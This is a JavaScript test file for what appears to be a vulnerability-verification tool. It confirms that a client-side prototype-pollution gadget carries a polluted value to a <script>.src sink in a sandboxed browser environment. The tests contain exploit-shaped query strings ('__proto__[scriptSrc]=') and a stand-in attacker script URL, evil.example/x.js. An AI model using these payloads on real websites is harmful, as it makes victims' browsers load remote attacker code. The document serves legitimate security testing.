import { test, describe } from 'node:test';
import assert from 'node:assert';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { reproduceRce } from '../../src/verification/reproduce.js';
import { executeInSandbox } from '../../src/utils/sandbox.js';

/**
 * Client-side prototype-pollution gadgets (BlackFan/client-side-prototype-
 * pollution style): a browser library funnels a polluted option into a DOM-XSS /
 * script-injection sink. jsdom doesn't execute scripts here, so the proof is
 * REACHABILITY of the polluted value to the sink (sink_reach) — how you find the
 * gadget — verified across the extended DOM sink hooks (here: <script>.src).
 */

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const FIX = (name) => path.resolve(__dirname, '..', 'fixtures', name);

describe('client-side script-src injection gadget', () => {
  test('reproduction confirms the polluted value reaches <script>.src', async () => {
    const r = await reproduceRce(FIX('client-script-src-gadget'), 'loadWidget',
      { property: 'scriptSrc' },
      { browserEnv: true, blockNetwork: true });
    assert.equal(r.verified, true, 'the polluted value must reach the script.src sink');
    assert.equal(r.payloadType, 'sink_reach');
    assert.equal(r.sink, 'script.src', 'the exact DOM sink must be identified');
    // The client-side PoC must be a browser exploit URL (not a Node require PoC),
    // with the gadget property in the __proto__ query param.
    assert.match(r.standalonePoC, /https:\/\/TARGET\/\?__proto__\[scriptSrc\]=/);
    assert.match(r.standalonePoC, /constructor\[prototype\]\[scriptSrc\]=/);
  });

  test('the sandbox worker records the script.src DOM sink under jsdom', async () => {
    const res = await executeInSandbox(FIX('client-script-src-gadget'), 'loadWidget', [{}], {
      mode: 'differential',
      browserEnv: true,
      blockNetwork: true,
      timeoutMs: 8000,
      pollution: { property: 'scriptSrc', value: 'https://evil.example/x.js' },
    });
    const sinks = (res?.newSinkAccesses || res?.sinkAccesses || []).map(s => s.sink);
    assert.ok(sinks.includes('script.src'), `expected script.src sink, got: ${sinks.join(', ') || '(none)'}`);
  });
});
